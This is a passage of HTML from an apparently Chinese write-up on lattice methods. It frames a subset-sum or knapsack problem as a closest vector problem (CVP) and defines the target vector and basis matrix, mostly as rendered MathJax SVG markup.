xmlns="http://www.w3.org/2000/svg" width="2.553ex" height="1.916ex" role="img" focusable="false" viewbox="0 -697 1128.6 847"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D412" d="M64 493Q64 582 120 636T264 696H272Q280 697 285 697Q380 697 454 645L480 669Q484 672 488 676T495 683T500 688T504 691T508 693T511 695T514 696T517 697T522 697Q536 697 539 691T542 652V577Q542 557 542 532T543 500Q543 472 540 465T524 458H511H505Q489 458 485 461T479 478Q472 529 449 564T393 614T336 634T287 639Q228 639 203 610T177 544Q177 517 195 493T247 457Q253 454 343 436T475 391Q574 326 574 207V200Q574 163 559 120Q517 12 389 -9Q380 -10 346 -10Q308 -10 275 -5T221 7T184 22T160 35T151 40L126 17Q122 14 118 10T111 3T106 -2T102 -5T98 -7T95 -9T92 -10T89 -11T84 -11Q70 -11 67 -4T64 35V108Q64 128 64 153T63 185Q63 203 63 211T69 223T77 227T94 228H100Q118 228 122 225T126 205Q130 125 193 88T345 51Q408 51 434 82T460 157Q460 196 439 221T388 257Q384 259 305 276T221 295Q155 313 110 366T64 493Z"/></g><g data-mml-node="mn" transform="translate(672,-150) scale(0.707)"><path data-c="1D7CF" d="M481 0L294 3Q136 3 109 0H96V62H227V304Q227 546 225 546Q169 529 97 529H80V591H97Q231 591 308 647L319 655H333Q355 655 359 644Q361 640 361 351V62H494V0H481Z"/></g></g></g></g></g></svg></mjx-container><font style="color:rgb(0, 0, 0);">使得和为 c 。实际上这是一个CVP问题。</font></p>
<p><font style="color:rgb(0, 0, 0);"></font></p>
<p><font style="color:rgb(0, 0, 0);">定义向量</font></p>
<p><font style="color:rgb(0, 0, 0);">                                                                     </font><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -3.443ex;" xmlns="http://www.w3.org/2000/svg" width="16.391ex" height="5.347ex" role="img" focusable="false" viewbox="0 -841.7 7245 2363.5"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D42D" d="M272 49Q320 49 320 136V145V177H382V143Q382 106 380 99Q374 62 349 36T285 -2L272 -5H247Q173 -5 134 27Q109 46 102 74T94 160Q94 171 94 199T95 245V382H21V433H25Q58 433 90 456Q121 479 140 523T162 621V635H224V444H363V382H224V239V207V149Q224 98 228 81T249 55Q261 49 272 49Z"/></g></g><g data-mml-node="mo" transform="translate(724.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="mo" transform="translate(1780.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mi" transform="translate(2169.6,0)"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"/></g><g data-mml-node="mo" transform="translate(2602.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"/></g><g data-mml-node="munder" transform="translate(3047.2,0)"><g data-mml-node="TeXAtom" data-mjx-texclass="OP"><g data-mml-node="munder"><g data-mml-node="mrow"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g><g data-mml-node="mo" transform="translate(500,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"/></g><g data-mml-node="mo" transform="translate(944.7,0)"><path data-c="2026" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60ZM525 60Q525 84 542 102T585 120Q609 120 627 104T646 61Q646 36 629 18T586 0T543 17T525 60ZM972 60Q972 84 989 102T1032 120Q1056 120 1074 104T1093 61Q1093 36 1076 18T1033 0T990 17T972 60Z"/></g><g data-mml-node="mo" transform="translate(2283.3,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"/></g><g data-mml-node="mn" transform="translate(2728,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g></g><g data-mml-node="mo" transform="translate(0,-619)"><path data-c="E152" d="M-24 327L-18 333H-1Q11 333 15 333T22 329T27 322T35 308T54 284Q115 203 225 162T441 120Q454 120 457 117T460 95V60V28Q460 8 457 4T442 0Q355 0 260 36Q75 118 -16 278L-24 292V327Z"/><path data-c="E153" d="M-10 60V95Q-10 113 -7 116T9 120Q151 120 250 171T396 284Q404 293 412 305T424 324T431 331Q433 333 451 333H468L474 327V292L466 278Q375 118 190 36Q95 0 8 0Q-5 0 -7 3T-10 24V60Z" transform="translate(2778,0)"/><g data-c="E156" transform="translate(1164,0)"><path data-c="E151" d="M-10 60Q-10 104 -10 111T-5 118Q-1 120 10 120Q96 120 190 84Q375 2 466 -158L474 -172V-207L468 -213H451H447Q437 -213 434 -213T428 -209T423 -202T414 -187T396 -163Q331 -82 224 -41T9 0Q-4 0 -7 3T-10 25V60Z"/><path data-c="E150" d="M-18 -213L-24 -207V-172L-16 -158Q75 2 260 84Q334 113 415 119Q418 119 427 119T440 120Q454 120 457 117T460 98V60V25Q460 7 457 4T441 0Q308 0 193 -55T25 -205Q21 -211 18 -212T-1 -213H-18Z" transform="translate(450,0)"/></g><svg width="914" height="720" x="350" y="-300" viewbox="228.5 -300 914 720"><path data-c="E154" d="M-10 0V120H410V0H-10Z" transform="scale(3.427,1)"/></svg><svg width="914" height="720" x="1964" y="-300" viewbox="228.5 -300 914 720"><path data-c="E154" d="M-10 0V120H410V0H-10Z" transform="scale(3.427,1)"/></svg></g></g></g><g data-mml-node="TeXAtom" transform="translate(1401.9,-1414) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/></g></g></g><g data-mml-node="msup" transform="translate(6275.2,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g><g data-mml-node="mi" transform="translate(422,363) scale(0.707)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"/></g></g></g></g></svg></mjx-container><font style="color:rgb(0, 0, 0);">  </font></p>
<p><font style="color:rgb(0, 0, 0);">则有格</font></p>
<p><font style="color:rgb(0, 0, 0);">                                                           </font><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -1.469ex;" xmlns="http://www.w3.org/2000/svg" width="74.502ex" height="4.07ex" role="img" focusable="false" viewbox="0 -1149.5 32929.9 1799"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"/></g><g data-mml-node="mo" transform="translate(958.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="mrow" transform="translate(2014.6,0)"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="5B" d="M224 -649V1150H455V1099H275V-598H455V-649H224Z"/></g><g data-mml-node="mtable" transform="translate(472,0)"><g data-mml-node="mtr" transform="translate(0,-385)"><g data-mml-node="mtd"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"/></g><g data-mml-node="mn" transform="translate(462,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g></g></g><g data-mml-node="mtd" transform="translate(1865.6,0)"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"/></g><g data-mml-node="mn" transform="translate(462,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"/></g></g></g><g data-mml-node="mtd" transform="translate(3731.1,0)"><g data-mml-node="mo"><path data-c="22EF" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250ZM525 250Q525 274 542 292T585 310Q609 310 627 294T646 251Q646 226 629 208T586 190T543 207T525 250ZM972 250Q972 274 989 292T1032 310Q1056 310 1074 294T1093 251Q1093 226 1076 208T1033 190T990 207T972 250Z"/></g></g><g data-mml-node="mtd" transform="translate(5903.1,0)"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"/></g><g data-mml-node="mi" transform="translate(462,-150) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/></g></g><g data-mml-node="mtext" transform="translate(936.3,0)"><path data-c="A0" d=""/></g><g data-mml-node="mn" transform="translate(1186.3,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"/></g></g><g data-mml-node="mtd" transform="translate(8589.4,0)"><g data-mml-node="mn"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"/></g></g><g data-mml-node="mtd" transform="translate(10089.4,0)"><g data-mml-node="mo"><path data-c="22EF" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250ZM525 250Q525 274 542 292T585 310Q609 310 627 294T646 251Q646 226 629 208T586 190T543 207T525 250ZM972 250Q972 274 989 292T1032 310Q1056 310 1074 294T1093 251Q1093 226 1076 208T1033 190T990 207T972 250Z"/></g></g><g data-mml-node="mtd" transform="translate(12261.4,0)"><g data-mml-node="mn"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"/></g><g data-mml-node="mtext" transform="translate(500,0)"><path data-c="A0" d=""/></g><g data-mml-node="mn" transform="translate(750,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"/></g></g><g data-mml-node="mtd" transform="translate(14511.4,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"/></g></g><g data-mml-node="mtd" transform="translate(16011.4,0)"><g data-mml-node="mo"><path data-c="22EF" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250ZM525 250Q525 274 542 292T585 310Q609 310 627 294T646 251Q646 226 629 208T586 190T543 207T525 250ZM972 250Q972 274 989 292T1032 310Q1056 310 1074 294T1093 251Q1093 226 1076 208T1033 190T990 207T972 250Z"/></g></g><g data-mml-node="mtd" transform="translate(18183.4,0)"><g data-mml-node="mn"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"/></g><g data-mml-node="mtext" transform="translate(500,0)"><path data-c="A0" d=""/></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(750,0)"><g data-mml-node="mo"><path data-c="22EE" d="M78 30Q78 54 95 72T138 90Q162 90 180 74T199 31Q199 6 182 -12T139 -30T96 -13T78 30ZM78 440Q78 464 95 482T138 500Q162 500 180 484T199 441Q199 416 182 398T139 380T96 397T78 440ZM78 840Q78 864 95 882T138 900Q162 900 180 884T199 841Q199 816 182 798T139 780T96 797T78 840Z"/></g></g></g><g data-mml-node="mtd" transform="translate(20211.4,0)"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="22EE" d="M78 30Q78 54 95 72T138 90Q162 90 180 74T199 31Q199 6 182 -12T139 -30T96 -13T78 30ZM78 440Q78 464 95 482T138 500Q162 500 180 484T199 441Q199 416 182 398T139 380T96 397T78 440ZM78 840Q78 864 95 882T138 900Q162 900 180 884T199 841Q199 816 182 798T139 780T96 797T78 840Z"/></g></g></g><g data-mml-node="mtd" transform="translate(21489.4,0)"><g data-mml-node="mo"><path data-c="22F1" d="M133 760Q133 784 150 802T193 820Q217 820 235 804T254 761Q254 736 237 718T194 700T151 717T133 760ZM580 460Q580 484 597 502T640 520Q664 520 682 504T701 461Q701 436 684 418T641 400T598 417T580 460ZM1027 160Q1027 184 1044 202T1087 220Q1111 220 1129 204T1148 161Q1148 136 1131 118T1088 100T1045 117T1027 160Z"/></g></g><g data-mml-node="mtd" transform="translate(23771.4,0)"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="22EE" d="M78 30Q78 54 95 72T138 90Q162 90 180 74T199 31Q199 6 182 -12T139 -30T96 -13T78 30ZM78 440Q78 464 95 482T138 500Q162 500 180 484T199 441Q199 416 182 398T139 380T96 397T78 440ZM78 840Q78 864 95 882T138 900Q162 900 180 884T199 841Q199 816 182 798T139 780T96 797T78 840Z"/></g></g><g data-mml-node="mtext" transform="translate(278,0)"><path data-c="A0" d=""/></g><g data-mml-node="mn" transform="translate(528,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"/></g></g><g data-mml-node="mtd" transform="translate(25799.4,0)"><g data-mml-node="mn"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"/></g></g><g data-mml-node="mtd" transform="translate(27299.4,0)"><g data-mml-node="mo"><path data-c="22EF" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250ZM525 250Q525 274 542 292T585 310Q609 310 627 294T646 251Q646 226 629 208T586 190T543 207T525 250ZM972 250Q972 274 989 292T1032 310Q1056 310 1074 294T1093 251Q1093 226 1076 208T1033 190T990 207T972 250Z"/></g></g><g data-mml-node="mtd" transform="translate(29471.4,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"/></g></g></g></g><g data-mml-node="mo" transform="translate(30443.4,0) translate(0 -0.5)"><path data-c="5D" d="M16 1099V1150H247V-649H16V-598H196V1099H16Z"/></g></g></g></g></svg></mjx-container><font style="color:rgb(0, 0, 0);"> </font></p>
<p><font style="color:rgb(0, 0, 0);">此时我们发现</font></p>
<p><font style="color:rgb(0, 0, 0);">                                       </font><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="46.546ex" height="2.728ex" role="img" focusable="false" viewbox="0 -955.8 20573.5 1205.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D40B" d="M643 285Q641 280 629 148T612 4V0H39V62H147V624H39V686H51Q75 683 228 683Q415 685 425 686H439V624H304V62H352H378Q492 62 539 138Q551 156 558 178T569 214T576 255T581 289H643V285Z"/></g></g><g data-mml-node="mi" transform="translate(692,0)"><path data-c="1D497" d="M380 367Q380 397 406 425T465 453Q493 453 516 430T540 357Q540 314 524 250T467 115T373 13Q338 -8 292 -8Q218 -8 167 23T116 129Q116 178 152 275T189 388Q189 396 187 398T176 401Q148 398 125 372T89 304Q84 288 81 285T61 282H55H44Q24 282 24 296Q24 306 34 330T64 382T116 431T189 452Q231 452 269 429T308 362Q308 346 273 255T238 114Q238 43 306 43Q336 43 363 65T407 118T437 182T456 239T462 268Q462 290 417 315Q380 335 380 367Z"/></g><g data-mml-node="mo" transform="translate(1481.2,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"/></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(2481.4,0)"><g data-mml-node="mi"><path data-c="1D42D" d="M272 49Q320 49 320 136V145V177H382V143Q382 106 380 99Q374 62 349 36T285 -2L272 -5H247Q173 -5 134 27Q109 46 102 74T94 160Q94 171 94 199T95 245V382H21V433H25Q58 433 90 456Q121 479 140 523T162 621V635H224V444H363V382H224V239V207V149Q224 98 228 81T249 55Q261 49 272 49Z"/></g></g><g data-mml-node="mo" transform="translate(3206.2,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="msup" transform="translate(4262,0)"><g data-mml-node="mrow"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"/></g><g data-mml-node="mtable" transform="translate(278,0)"><g data-mml-node="mtr"><g data-mml-node="mtd"><g data-mml-node="mn"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"/></g></g><g data-mml-node="mtd" transform="translate(1500,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"/></g><g data-mml-node="msub" transform="translate(500,0)"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"/></g><g data-mml-node="mn" transform="translate(518,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g></g><g data-mml-node="mo" transform="translate(1643.8,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"/></g><g data-mml-node="mn" transform="translate(2644,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g></g><g data-mml-node="mtd" transform="translate(5644,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 